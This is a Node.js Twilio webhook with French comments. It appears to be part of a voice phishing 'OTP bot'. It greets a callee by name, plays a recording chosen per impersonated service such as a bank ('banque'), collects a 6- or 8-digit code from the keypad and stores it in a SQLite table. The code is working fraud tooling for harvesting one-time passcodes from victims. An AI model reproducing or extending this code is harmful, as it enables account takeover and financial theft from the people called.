module.exports = function(request, response) {
    /**
     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
     */
    const config = require('.././config');

    /**
     * Intégration des dépendences SQLITE3
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Récupération des variables postées permettant d'ordonner la réponse API en TwiML
     */
    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    /**
     * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
     */
    db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
         * Pareil pour le nom de la personne à appeler
         */
        var service = row == undefined ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        

        /**
         * Au cas où le callSid est trouvé mais le service n'existe pas, on utilise l'audio par défaut
         */
        if (config[service + 'filepath'] == undefined) service = 'default';
        /**
         * L'on crée ici les url des audios grâce aux données dans le fichier config
         */
        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = service == 'banque' ? '8' : '6';

        /**
         * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
         */
        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';

        /**
         * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
         */
        length = service == 'banque' ? 8 : 6;
        if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
            /**
             * Audio de fin
             */
            respond(end);

            /**
             * Ajout du code en DB
             */
            db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                if (err) {
                    return console.log(err.message);
                }
            });
        } else {
            /**
             * L'on retourne le TwiML de base pour rejouer l'audio
             */
            respond(ask);
        }
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};